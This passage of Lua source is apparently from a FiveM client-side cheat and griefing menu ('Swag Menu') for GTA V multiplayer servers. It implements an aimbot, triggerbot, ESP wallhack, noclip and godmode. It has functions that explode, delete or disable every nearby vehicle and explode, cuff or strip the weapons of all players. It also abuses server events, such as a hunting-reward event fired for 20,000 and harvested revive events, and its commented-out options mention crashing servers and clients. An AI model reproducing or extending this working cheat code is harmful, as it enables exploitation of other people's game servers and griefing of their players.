		SetRunSprintMultiplierForPlayer(PlayerId(), SliderOptions.FastRun.Values[SliderOptions.FastRun.Selected])
		SetPedMoveRateOverride(PlayerPedId(), SliderOptions.FastRun.Values[SliderOptions.FastRun.Selected])
		
		local jrad = SliderOptions.Jradius.Values[SliderOptions.Jradius.Selected]
		if jrad ~= 0 then
			jesus_tick(jrad)
		end
		
		if aimbot_enabled then
			aimbot_tick(not aimbot_peds, aimbot_silent)
		end

		if emp_nearby_cars then
			for vehicle in EnumerateVehicles() do
				if (vehicle ~= GetVehiclePedIsIn(PlayerPedId(), false)) then
					NetworkRequestControlOfEntity(vehicle)
					SetVehicleUndriveable(vehicle,true)
					SetVehicleEngineHealth(vehicle, 100)
				end
			end
		end


		if destroy_cars then
			for vehicle in EnumerateVehicles() do
				if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
					SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, true), 1, 1)
					DeleteEntity(GetVehiclePedIsIn(vehicle, true))
					SetEntityAsMissionEntity(vehicle, 1, 1)
					DeleteEntity(vehicle)
				end
			end
		end
		
		if launch_cars then
			for vehicle in EnumerateVehicles() do
				RequestControlOnce(vehicle)
				ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
			end
		end
		
		if huntspam then
            TriggerServerEvent('esx-qalle-hunting:reward', 20000)
            TriggerServerEvent('esx-qalle-hunting:sell')
		end
		
		if alarm_cars then
			for vehicle in EnumerateVehicles() do
				if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
					NetworkRequestControlOfEntity(vehicle)
					SetVehicleAlarmTimeLeft(vehicle, 500)
					SetVehicleAlarm(vehicle,true)
					StartVehicleAlarm(vehicle)
				end
			end
		end
		
		if explode_cars then
			for vehicle in EnumerateVehicles() do
				if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), false)) then
					NetworkRequestControlOfEntity(vehicle)
					NetworkExplodeVehicle(vehicle, true, true, false)
				end
			end
		end
		
		if burger_cars then
			local hamburghash = GetHashKey("xs_prop_hamburgher_wl")
			for vehicle in EnumerateVehicles() do
				local hamburger = CreateObject(hamburghash, 0, 0, 0, true, true, true)
				AttachEntityToEntity(hamburger, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true)
			end
		end

		if esp_enabled then
			
			local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
			
			local plist = GetActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				if id ~= PlayerId() and GetPlayerServerId(id) ~= 0 then
					local ra = {r = 255, g = 255, b = 255, a = 255}
					local pPed = GetPlayerPed(id)
					local x, y, z = table.unpack(GetEntityCoords(pPed))
					
					local dist = Vdist(cx, cy, cz, x, y, z)
					
					if dist <= SliderOptions.ESPDistance.Values[SliderOptions.ESPDistance.Selected] then
						local message = '';
						
						if esp_names then
							message = message .. GetPlayerName(id) .. '\n'
						end
						
						if esp_distance then
							message = message .. math.round(#(vector3(cx, cy, cz) - vector3(x, y, z)), 1) .. 'm\n'
						end
						
						if esp_vehicle and IsPedInAnyVehicle(pPed, true) then
							local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
							message = message .. VehName
						end
						
						if esp_id then
							message = message .. "L: " .. id .. ' | '
							message = message .. "S: " .. GetPlayerServerId(id)
						end
						
						DrawText3D(x, y, z + 1.0, message, ra.r, ra.g, ra.b)
						
						if esp_lines then
							DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
						end
					end
				end
			end
		end


		if VehGod and IsPedInAnyVehicle(PlayerPedId(), true) then
			SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId()), true)
		end

		local TSpeed = SliderOptions.TorqueBoost.Values[SliderOptions.TorqueBoost.Selected]
		if TSpeed ~= 0 and IsPedInAnyVehicle(PlayerPedId(), true) then
			SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), TSpeed * 20.0)
		end
		
		if VehSpeed and IsPedInAnyVehicle(PlayerPedId(), true) then
			if IsControlPressed(0, 209) then
				SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 70.0)
			elseif IsControlPressed(0, 210) then
				SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId()), 0.0)
			end
		end

		if TriggerBot then
			local isAiming, targetEntity = GetEntityPlayerIsFreeAimingAt(PlayerId(), Entity)
			if isAiming then
				if IsPedAPlayer(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
					ShootPlayer(Entity)
				end
			end
		end

		if Swag.Toggle.RainbowVehicle then
			local ra = RGBRainbow(1.0)
			SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
			SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
		end


		if Swag.Toggle.Forklift then
			if IsControlJustPressed(0, 46) then
				-- if already attached detach
				if isAttached then
					DetachEntity(attachedEntity, true, true)
					
					attachedEntity = nil
					isAttached = false
				else	
					-- get vehicle infront
					local pos = GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 2.0, 0.0)
					local veh = GetClosestVehicle(pos, 2.0, 0, 70)
					
					-- if vehicle is found
					if veh ~= 0 and IsPedInAnyVehicle(PlayerPedId(), false) then
						local currentVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
						
						-- check if player is in forklift
						if GetEntityModel(currentVehicle) == `forklift` then 
							isAttached = true
							show = false
							attachedEntity = veh
							
							-- attach vehicle to forklift, you can change some values
							AttachEntityToEntity(veh, currentVehicle, 3, 0.0, 1.3, -0.09, 0.0, 0, 90.0, false, false, false, false, 2, true)
						end
					end
				end
			end        
		end
		

		if Swag.Player.isNoclipping then
			local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
			local k = nil
			local x, y, z = nil
			
			if not isInVehicle then
				k = PlayerPedId()
				x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
			else
				k = GetVehiclePedIsIn(PlayerPedId(), 0)
				x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
			end
			
			if isInVehicle and Swag.Game:GetSeatPedIsIn(PlayerPedId()) ~= -1 then Swag.Game:RequestControlOnce(k) end
			
			local dx, dy, dz = Swag.Game:GetCamDirection()
			SetEntityVisible(PlayerPedId(), 0, 0)
			SetEntityVisible(k, 0, 0)
			
			SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
			
			if IsDisabledControlJustPressed(0, Swag.Keys["LEFTSHIFT"]) then -- Change speed
				oldSpeed = NoclipSpeed
				NoclipSpeed = NoclipSpeed * 5
			end
			
			if IsDisabledControlJustReleased(0, Swag.Keys["LEFTSHIFT"]) then -- Restore speed
				NoclipSpeed = oldSpeed
			end
			
			if IsDisabledControlPressed(0, 32) then -- MOVE FORWARD
				x = x + NoclipSpeed * dx
				y = y + NoclipSpeed * dy
				z = z + NoclipSpeed * dz
			end
			
			if IsDisabledControlPressed(0, 269) then -- MOVE BACK
				x = x - NoclipSpeed * dx
				y = y - NoclipSpeed * dy
				z = z - NoclipSpeed * dz
			end
			
			if IsDisabledControlPressed(0, Swag.Keys["SPACE"]) then -- MOVE UP
				z = z + NoclipSpeed
			end
			
			if IsDisabledControlPressed(0, Swag.Keys["LEFTCTRL"]) then -- MOVE DOWN
				z = z - NoclipSpeed
			end
			
			
			SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
		end
		
		Citizen.Wait(0)
	end
end
CreateThread(MenuToggleThread)



-- Menu runtime for drawing and handling input
local function MenuRuntimeThread()
	FreezeEntityPosition(entity, false)
	local currentItemIndex = 1
	local selectedItemIndex = 1

	-- MAIN MENU
	SwagUI.CreateMenu("SwagMainMenu", "SWAG MENU")
	SwagUI.SetSubTitle("SwagMainMenu", "Main Menu")

	-- MAIN MENU CATEGORIES
	SwagUI.CreateSubMenu("SelfMenu", "SwagMainMenu", "Player")
	SwagUI.CreateSubMenu("SelfSuperPowers", "SelfMenu", "Fun Menu")
	SwagUI.CreateSubMenu("SelfSkinChanges", "SelfMenu", "Outfit Menu")
	SwagUI.CreateSubMenu("meffects", "SelfMenu", "Main Effects")
	SwagUI.CreateSubMenu("characterchanges", "SelfMenu", "Character Changes")
	SwagUI.CreateSubMenu("basicfunctions", "SelfMenu", "Main Menu")
	SwagUI.CreateSubMenu('OnlinePlayersMenu', 'SwagMainMenu', "Player List")
	
	SwagUI.CreateSubMenu("VisualMenu", "SwagMainMenu", "Visual")
	SwagUI.CreateSubMenu("ESPMenu", "VisualMenu", "ESP")
	
	SwagUI.CreateSubMenu("TeleportMenu", "SwagMainMenu", "Teleporting")
	
	-- MAIN MENU > Vehicle
	SwagUI.CreateSubMenu("LocalVehicleMenu", "SwagMainMenu", "Vehicle")
	-- MAIN MENU > Vehicle > Vehicle Spawner
	SwagUI.CreateSubMenu("LocalVehicleSpawner", "LocalVehicleMenu", "Vehicle Spawner")
	SwagUI.CreateSubMenu("VehicleSpeed", "LocalVehicleMenu", "Boost Options")
	SwagUI.CreateSubMenu("Vdrive", "LocalVehicleMenu", "Driving Effects")
	SwagUI.CreateSubMenu("VFun", "LocalVehicleMenu", "Fun Vehicles")
	-- MAIN MENU > Vehicle > Vehicle Spawner > $class
	SwagUI.CreateSubMenu("localcompacts", "LocalVehicleSpawner", "Compacts")
	SwagUI.CreateSubMenu("localsedans", "LocalVehicleSpawner", "Sedans")
	SwagUI.CreateSubMenu("localsuvs", "LocalVehicleSpawner", "SUVs")
	SwagUI.CreateSubMenu("localcoupes", "LocalVehicleSpawner", "Coupes")
	SwagUI.CreateSubMenu("localmuscle", "LocalVehicleSpawner", "Muscle")
	SwagUI.CreateSubMenu("localsportsclassics", "LocalVehicleSpawner", "Sports Classics")
	SwagUI.CreateSubMenu("localsports", "LocalVehicleSpawner", "Sports")
	SwagUI.CreateSubMenu("localsuper", "LocalVehicleSpawner", "Super")
	SwagUI.CreateSubMenu("localmotorcycles", "LocalVehicleSpawner", "Motorcycles")
	SwagUI.CreateSubMenu("localoffroad", "LocalVehicleSpawner", "Off-Road")
	SwagUI.CreateSubMenu("localindustrial", "LocalVehicleSpawner", "Industrial")
	SwagUI.CreateSubMenu("localutility", "LocalVehicleSpawner", "Utility")
	SwagUI.CreateSubMenu("localvans", "LocalVehicleSpawner", "Vans")
	SwagUI.CreateSubMenu("localcycles", "LocalVehicleSpawner", "Cycles")
	SwagUI.CreateSubMenu("localboats", "LocalVehicleSpawner", "Boats")
	SwagUI.CreateSubMenu("localhelicopters", "LocalVehicleSpawner", "Helicopters")
	SwagUI.CreateSubMenu("localplanes", "LocalVehicleSpawner", "Planes")
	SwagUI.CreateSubMenu("localservice", "LocalVehicleSpawner", "Service")
	SwagUI.CreateSubMenu("localcommercial", "LocalVehicleSpawner", "Commercial")
	
	SwagUI.CreateSubMenu("LocalWepMenu", "SwagMainMenu", "Weapons")
	SwagUI.CreateSubMenu("ServerMenu", "SwagMainMenu", "Trolling")
	
	SwagUI.CreateSubMenu("GriefMenu", "SwagMainMenu", "Griefer Options")
	SwagUI.CreateSubMenu("NearbyCarTroll", "GriefMenu", "Nearby Car Trolls")
	SwagUI.CreateSubMenu("objattatch", "GriefMenu", "Objects")
	SwagUI.CreateSubMenu("freezeall", "GriefMenu", "Freeze / Cuff")
	SwagUI.CreateSubMenu("weaponall", "GriefMenu", "Weapons")
	SwagUI.CreateSubMenu("explodeall", "GriefMenu", "Exploding")
	SwagUI.CreateSubMenu('LSC', 'LocalVehicleMenu', "Los Santos Customs")
	SwagUI.CreateSubMenu('lsc_bodywork', 'LSC', 'Bodywork')
	SwagUI.CreateSubMenu('lsc_performance', 'LSC', 'Performance Tuning')

	-- ONLINE PLAYERS MENU
	SwagUI.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayersMenu', "Player Options")
	
	-- ONLINE PLAYERS > PLAYER > WEAPON OPTIONS MENU
	SwagUI.CreateSubMenu('OnlineWepMenu', 'PlayerOptionsMenu', 'Weapon Menu')
	SwagUI.CreateSubMenu('OnlineWepCategory', 'OnlineWepMenu', 'Give Weapon')
	SwagUI.CreateSubMenu("OnlineMeleeWeapons", "OnlineWepCategory", "Melee")
	SwagUI.CreateSubMenu("OnlineSidearmWeapons", "OnlineWepCategory", "Handguns")
	SwagUI.CreateSubMenu("OnlineAutorifleWeapons", "OnlineWepCategory", "Assault Rifles")
	SwagUI.CreateSubMenu("OnlineShotgunWeapons", "OnlineWepCategory", "Shotguns")
	SwagUI.CreateSubMenu("OnlineTrollMenu", "PlayerOptionsMenu", "Trolling")
	SwagUI.CreateSubMenu("objmenu", "PlayerOptionsMenu", "Object Trolling")
	SwagUI.CreateSubMenu("PedTrollMenu", "PlayerOptionsMenu", "Ped Trolling")
	SwagUI.CreateSubMenu("ExplodeTroll", "PlayerOptionsMenu", "Exploding")
	
	SwagUI.CreateSubMenu('OnlineVehicleMenuPlayer', 'PlayerOptionsMenu', "Vehicle")
	SwagUI.CreateSubMenu('ESXMenuPlayer', 'PlayerOptionsMenu', "ESX")
	SwagUI.CreateSubMenu('TeleportP', 'PlayerOptionsMenu', "Teleporting")
	SwagUI.CreateSubMenu("aimbotoptions", "LocalWepMenu", "Aimbot")
	SwagUI.CreateSubMenu("AmmoSettings", "LocalWepMenu", "Ammo")
	SwagUI.CreateSubMenu("BulletSettings", "LocalWepMenu", "Bullets")
	SwagUI.CreateSubMenu("ToolBoxs", "LocalWepMenu", "ToolBox")
	SwagUI.CreateSubMenu("LocalWepCategory", "LocalWepMenu", "Give Weapon")
	SwagUI.CreateSubMenu("LocalMeleeWeapons", "LocalWepCategory", "Melee")
	SwagUI.CreateSubMenu("LocalSidearmWeapons", "LocalWepCategory", "Handguns")
	SwagUI.CreateSubMenu("LocalSmgWeapons", "LocalWepCategory", "Submachine Guns")
	SwagUI.CreateSubMenu("LocalShotgunWeapons", "LocalWepCategory", "Shotguns")
	SwagUI.CreateSubMenu("LocalAssaultRifleWeapons", "LocalWepCategory", "Assault Rifles")
	SwagUI.CreateSubMenu("LocalMachineGunWeapons", "LocalWepCategory", "Light Machine Guns")
	SwagUI.CreateSubMenu("LocalSniperRifles", "LocalWepCategory", "Sniper Rifles")
	SwagUI.CreateSubMenu("LocalHeavyWeapons", "LocalWepCategory", "Heavy Weapons")
	
	SwagUI.CreateSubMenu("ServerResources", "ServerMenu", "Server Resources")
	SwagUI.CreateSubMenu('ResourceData', "ServerResources", "Resource Data")
	SwagUI.CreateSubMenu('ResourceCEvents', 'ResourceData', 'Event Handlers')
	SwagUI.CreateSubMenu('ResourceSEvents', 'ResourceData', 'Server Events')
	SwagUI.CreateSubMenu("ESXBoss", "ServerMenu", "ESX Boss Menus")
	SwagUI.CreateSubMenu("ServerMoneyOptions", "ServerMenu", "Money Options")
	SwagUI.CreateSubMenu("ESXMisc", "ServerMenu", "ESX Misc Options")
	SwagUI.CreateSubMenu("ESXDrugs", "ServerMenu", "ESX Drugs")
	SwagUI.CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
	SwagUI.CreateSubMenu("VRPOptions", "ServerMenu", "VRP Server Options")
	
	for i, mod in pairs(LSC.vehicleMods) do
		SwagUI.CreateSubMenu(mod.meta, 'lsc_bodywork', mod.name)
	end

	SwagUI.CreateSubMenu("primary", "lscrepsray", "Primary Color")
	SwagUI.CreateSubMenu("secondary", "lscrepsray", "Secondary Color")

	SwagUI.CreateSubMenu("rimpaint", "lscrepsray", "Wheel Paint")

	local SelectedPlayer = nil
	local SelectedResource = nil

	-- Event sniffing
	for _, resource in pairs(validResources) do

		for key, name in pairs(validResourceEvents[resource]) do
			local event = string.lower(name)

			-- Revive event
			if string.match(event, 'revive') then
				Swag.Events.Revive[#Swag.Events.Revive + 1] = name
			end
		end

	end

	while isMenuEnabled do
		Swag.Player.Vehicle = GetVehiclePedIsUsing(PlayerPedId())

		if IsDisabledControlJustPressed(0, Swag.Keys["K"]) then
			--GateKeep()
			SwagUI.OpenMenu("SwagMainMenu")
		end

		if SwagUI.IsMenuOpened("SwagMainMenu") then
			if SwagUI.MenuButton("Player", "SelfMenu") then end
			if SwagUI.MenuButton("Vehicle", "LocalVehicleMenu") then end
			if SwagUI.MenuButton("Player List", "OnlinePlayersMenu") then end
			if SwagUI.MenuButton("All Player Trolling", "GriefMenu") then end
			if SwagUI.MenuButton("Visual", "VisualMenu") then end
			if SwagUI.MenuButton("Weapons", "LocalWepMenu") then end
			if SwagUI.MenuButton("Teleporting", "TeleportMenu") then end
			if SwagUI.MenuButton("Triggers", "ServerMenu") then end

			if SwagUI.Button("Unload Menu") then
				isMenuEnabled = false
			end
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("SelfMenu") then
		
			if SwagUI.MenuButton("Main Menu", "basicfunctions") then end
			
			if SwagUI.MenuButton("Main Effects", "meffects") then end
			
			if SwagUI.MenuButton("Outfit Menu", "SelfSkinChanges") then end
			
			if SwagUI.MenuButton("Character Changes", "characterchanges") then end
	
			if SwagUI.MenuButton("Fun Menu", "SelfSuperPowers") then end
			
			
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("basicfunctions") then
		
		
			if SwagUI.Button("Max Health") then
				SetEntityHealth(PlayerPedId(), 200)
			end
			
			if SwagUI.Button("Max Armour") then
				SetPedArmour(PlayerPedId(), 200)
			end
		
			if SwagUI.CheckBox("Infinite Stamina", InfStamina, function(enabled) InfStamina = enabled end) then
				
			end
	
			if SwagUI.CheckBox("Godmode", God_mode, function(enabled) God_mode = enabled end) then
			end
			
			if SwagUI.CheckBox("Noclip", Swag.Player.isNoclipping, function(enabled) 
				Swag.Player.isNoclipping = enabled 
				if Swag.Player.isNoclipping then
					SetEntityVisible(PlayerPedId(), false, false)
				else
					SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
					SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, false)
					SetEntityVisible(PlayerPedId(), true, false)
				end
			end) then end

			if SwagUI.CheckBox("Ragdoll", Swag.Toggle.SelfRagdoll) then
				SelfRagdoll()
			end

			if SwagUI.CheckBox("Anti-Ragdoll", RagdollToggle, function(enabled) RagdollToggle = enabled end) then end
			
			if SwagUI.Button("Suicide") then
				KillYourself()
			end

			if SwagUI.Button("~g~ESX ~s~Revive Self") then
				for i = 1, #Swag.Events.Revive do
					TriggerEvent(Swag.Events.Revive[i])
				end
			end
			
			
			
			
				
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("SelfSuperPowers") then

			if SwagUI.Button("Sky Dive (Give Parachute Before)") then
				local x,y,z = table.unpack(GetEntityCoords(PlayerPedId()))
				SetEntityCoords(PlayerPedId(), vector3(x,y,z + 700))
				TaskSkyDive(PlayerPedId())
			end

			if SwagUI.CheckBox("Midget Mode", MMode, function(enabled) MMode = enabled end) then
				SetPedConfigFlag(PlayerPedId(),223,MMode)
			end

			if SwagUI.Slider("Jesus Mode", SliderOptions.Jradius.Words, SliderOptions.Jradius.Selected, function(selectedIndex)
				if SliderOptions.Jradius.Selected ~= selectedIndex then
					SliderOptions.Jradius.Selected = selectedIndex
				end
			end) then end

			if SwagUI.CheckBox("Magneto", Swag.Toggle.MagnetoMode) then
				MagnetoMode()
			end
			
			if SwagUI.CheckBox("Spiderman", grapple_hook_enabled, function(enabled) grapple_hook_enabled = enabled end) then end
			
			if SwagUI.CheckBox("Meteorites ", Swag.Toggle.MeteoriteMode) then
				MeteoriteMode()
			end
			
			--grapple_hook_enabled
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("TeleportMenu") then
			if SwagUI.CheckBox("Teleport With Vehicle", tp_take_veh, function(enabled) tp_take_veh = enabled end) then
			end
			
			if SwagUI.Button("Teleport to waypoint") then
				TeleportToWaypoint()
			end
			
			if SwagUI.ComboBox("Teleport To", ComboOptions.TPTo.Words, ComboOptions.TPTo.Selected, function(selectedIndex)
				if ComboOptions.TPTo.Selected ~= selectedIndex then
					ComboOptions.TPTo.Selected = selectedIndex
				end
			end) then
				TPToF(ComboOptions.TPTo.Values[ComboOptions.TPTo.Selected])
			end
			
			if SwagUI.Button("Teleport Into Nearest Vehicle") then
				TeleportVehicle()
			end
		
		
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("meffects") then
		
			if SwagUI.Slider("Move Speed", SliderOptions.FastRun.Words, SliderOptions.FastRun.Selected, function(selectedIndex)
				if SliderOptions.FastRun.Selected ~= selectedIndex then 
					SliderOptions.FastRun.Selected = selectedIndex
				end
			end) then end
		
			if SwagUI.CheckBox("Super Jump", SuperJump, function(enabled) SuperJump = enabled end) then

			end

			if SwagUI.CheckBox("Invisibility", invisable1, function(enabled) invisable1 = enabled end) then

			end
	
			if SwagUI.CheckBox("Thermal Vision", bTherm, function(enabled) bTherm = enabled end) then
				SetSeethrough(bTherm)
			end
			
			if SwagUI.CheckBox("Night Vision", NVision, function(enabled) NVision = enabled end) then
				SetNightvision(NVision)
			end
			
		
		
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("characterchanges") then
		
			if SwagUI.Button("Control Nearest Person") then
				control_nearest_ped(false)
			end
			
			if SwagUI.Button("Control Nearest Animal") then
				control_nearest_ped(true)
			end
			
		
			if SwagUI.Button("Ride A Mountain Lion (Glitchy)") then
				Deer.Create()
				Citizen.Wait(150)
				Deer.Ride()
			end
		
			if SwagUI.Button("Get A Pet") then
				local pet_list = {
					"a_c_chop", "a_c_husky", "a_c_cat_01", "a_c_coyote", "a_c_chimp",
					"a_c_poodle", "a_c_pug", "a_c_rabbit_01", "a_c_retriever", "a_c_mtlion",
					"a_c_shepherd", "a_c_westy", "a_c_cormorant"
				}
				local rand = math.ceil(math.random(#pet_list))
				local model = GetHashKey(pet_list[rand])
				RequestModel(model)
				while not HasModelLoaded(model) do
					Citizen.Wait(0)
				end
				local pos = GetEntityCoords(PlayerPedId(), true)
				local ped = CreatePed(26, model, pos.x, pos.y, pos.z, heading, true, true)
				table.insert(bg_ped_list, ped)
			end
		
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("SelfSkinChanges") then
		
			if SwagUI.Button("Random Skin") then
				RandomSkin(PlayerId())
			end
			
			if SwagUI.Button("Model Changer") then
				ChangeModel()
			end 
				
			if SwagUI.Button ("Change To Bigfoot") then
				BecomeBigfoot()
			end
			
			
			if SwagUI.Button("SWAT", "Be MPPlayer") then
				resetAppearance()
				changeAppearance("TORSO", 17, 0)
				changeAppearance("MASK", 56, 1)
				changeAppearance("HATS", 40, 0)
				changeAppearance("HAIR", 0, 0)
				changeAppearance("TORSO", 19, 0)
				changeAppearance("GLASSES", 0, 1)
				changeAppearance("LEGS", 34, 0)
				changeAppearance("SHOES", 25, 0)
				changeAppearance("SPECIAL", 0, 0)
				changeAppearance("SPECIAL2", 58, 0)
				changeAppearance("SPECIAL3", 4, 1)
				changeAppearance("TORSO2", 55, 0)
				changeAppearance("HANDS", 0, 0)
			elseif SwagUI.Button("Killer Elf", "Be MPPlayer") then
				resetAppearance()
				changeAppearance("MASK", 34, 0)
				changeAppearance("TORSO", 4, 0)
				changeAppearance("LEGS", 19, 1)
				changeAppearance("SHOES", 22, 1)
				changeAppearance("SPECIAL1", 18, 0)
				changeAppearance("SPECIAL2", 28, 8)
				changeAppearance("TORSO2", 19, 1)
			elseif SwagUI.Button("Santa Claus", "Be MPPlayer") then
				resetAppearance()
				changeAppearance("MASK", 8, 0)
				changeAppearance("TORSO", 12, 0)
				changeAppearance("LEGS", 19, 0)
				changeAppearance("SHOES", 4, 4)
				changeAppearance("SPECIAL1", 10, 0)
				changeAppearance("SPECIAL2", 21, 2)
				changeAppearance("TORSO2", 19, 0)
			elseif SwagUI.Button("Penguin", "Be MPPlayer") then
				resetAppearance()
				changeAppearance("TORSO", 0, 0)
				changeAppearance("MASK", 31, 0)
				changeAppearance("HATS", 0, 0)
				changeAppearance("HAIR", 0, 0)
				changeAppearance("GLASSES", 0, 0)
				changeAppearance("LEGS", 32, 0)
				changeAppearance("SHOES", 17, 0)
				changeAppearance("SPECIAL1", 0, 0)
				changeAppearance("SPECIAL2", 57, 0)
				changeAppearance("TEXTURES", 0, 0)
				changeAppearance("TORSO2", 51, 0)
				changeAppearance("HANDS", 0, 0)
			elseif SwagUI.Button("Soldier 2", "Be MPPlayer") then
				resetAppearance()
				changeAppearance("HATS", 40, 0)
				changeAppearance("MASK", 28, 0)
				changeAppearance("TORSO", 44, 0)
				changeAppearance("LEGS", 34, 0)
				changeAppearance("HANDS", 45, 0)
				changeAppearance("SHOES", 25, 0)
				changeAppearance("SPECIAL2", 56, 1)
				changeAppearance("TORSO2", 53, 0)
				
			elseif SwagUI.Button("Terrorist(Jesus Cook)", "Be MPPlayer") then
				resetAppearance()
				changeAppearance("MASK", 115,6)
				changeAppearance("TORSO", 15, 0)
				changeAppearance("LEGS", 86, 17)
				changeAppearance("HANDS", 19, 2)
				changeAppearance("SHOES", 12, 0)
				changeAppearance("TORSO2", 221, 17)
			end
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("VisualMenu") then
			-- if
			-- 	SwagUI.CheckBox(
			-- 	"TriggerBot",
			-- 	TriggerBot,
			-- 	function(enabled)
			-- 	TriggerBot = enabled
			-- 	end)
			-- then
			-- elseif
			-- 	SwagUI.CheckBox(
			-- 	"AimBot",
			-- 	AimBot,
			-- 	function(enabled)
			-- 	AimBot = enabled
			-- 	end)
			-- then
			if SwagUI.MenuButton("ESP", "ESPMenu") then end
			if SwagUI.CheckBox("Crosshair", Crosshair, function(enabled) Crosshair = enabled end) then end
			if SwagUI.CheckBox("Minimap", showMinimap, function(enabled) showMinimap = enabled end) then end
			if SwagUI.CheckBox("Force 3rd Person", thirdperson, function(enabled) thirdperson = enabled end) then end
			if SwagUI.CheckBox("Show Player Blips", playerBlips, function(enabled) playerBlips = enabled end) then end
			if SwagUI.CheckBox("Show Gamertags", showNametags, function(enabled) showNametags = enabled end) then end
			if SwagUI.CheckBox("Show Coords", esp_Coords, function(enabled) esp_Coords = enabled end) then end

			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("ESPMenu") then
			if SwagUI.CheckBox("Enabled", esp_enabled, function(enabled) esp_enabled = enabled end) then end
			if SwagUI.CheckBox("Names", esp_names, function(enabled) esp_names = enabled end) then end
			if SwagUI.CheckBox("Distance", esp_distance, function(enabled) esp_distance = enabled end) then end
			if SwagUI.CheckBox("Vehicle", esp_vehicle, function(enabled) esp_vehicle = enabled end) then end
			if SwagUI.CheckBox("ID", esp_id, function(enabled) esp_id = enabled end) then end
			if SwagUI.CheckBox("Show Lines", esp_lines, function(enabled) esp_lines = enabled end) then end
			if SwagUI.Slider("Max Distance", SliderOptions.ESPDistance.Words, SliderOptions.ESPDistance.Selected, function(selectedIndex)
				if SliderOptions.ESPDistance.Selected ~= selectedIndex then
					SliderOptions.ESPDistance.Selected = selectedIndex
				end
			end) then end
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("GriefMenu") then
		
			if SwagUI.MenuButton("Nearby Car Troll", "NearbyCarTroll") then end
			
			--if SwagUI.Button("Airstrike Waypoint") then
				--AirstrikeWaypoint()
			--end
			
			if SwagUI.MenuButton("Objects", "objattatch") then end
			
			if SwagUI.MenuButton("Exploding", "explodeall") then end
			
			if SwagUI.MenuButton("Freeze / Cuff", "freezeall") then end
			
			if SwagUI.MenuButton("Weapons", "weaponall") then end
			

			-- if
			-- 	SwagUI.CheckBox(
			-- 	"~r~Explode All",
			-- 	blowall,
			-- 	function(enabled)
			-- 	blowall = enabled
			-- 	end)
			-- then
			-- elseif
			-- 	SwagUI.CheckBox(
			-- 	"~r~Overload Client Stream",
			-- 	nuke,
			-- 	function(enabled)
			-- 	nuke = enabled
			-- 	end)
			-- then
			-- elseif
			-- 	SwagUI.CheckBox(
			-- 	"~r~Trigger Malicious ESX",
			-- 	esxdestroy,
			-- 	function(enabled)
			-- 	esxdestroy = enabled
			-- 	end)
			-- then
			-- elseif
			-- 	SwagUI.CheckBox(
			-- 	"~r~Crash Server/Clients",
			-- 	servercrasher,
			-- 	function(enabled)
			-- 	servercrasher = enabled
			-- 	end)
			-- then
			-- end
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("explodeall") then
		
			if SwagUI.Button("Explode All Players") then
				ExplodeAll()
			end
			
			if SwagUI.Button("Fire Hydrant All") then
				HydrantAll()
			end
			
			if SwagUI.Button("Fire Pipe All") then
				FirePipeAll()
			end
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("weaponall") then
		
			if SwagUI.Button("Give All Weapons") then
				local plist = GetActivePlayers()
				for i = 1, #plist do
					local id = plist[i]
					local ped = GetPlayerPed(id)
					RequestControlOnce(ped)
					for i = 1, #t_Weapons do
						GiveWeaponToPed(ped, t_Weapons[i][1])
					end
				end
			end
		
			if SwagUI.Button("Remove All Weapons") then
				local plist = GetActivePlayers()
				for i = 1, #plist do
					local id = plist[i]
					local ped = GetPlayerPed(id)
					RequestControlOnce(ped)
					for i = 1, #t_Weapons do
						RemoveWeaponFromPed(ped, t_Weapons[i][1])
					end
				end
			end
			
			
			SwagUI.Display()
		elseif SwagUI.IsMenuOpened("freezeall") then
		
			if SwagUI.ComboBox("Cuff Type", SliderOptions.CuffType.Words, SliderOptions.CuffType.Selected, function(selectedIndex)
				if SliderOptions.CuffType.Selected ~= selectedIndex then
					SliderOptions.CuffType.Selected = selectedIndex
				end
			end) then end
			
			if SwagUI.Button("Cuff All Players") then
				CuffAll()
			end	
			
			if SwagUI.Button("Kick All From Car") then
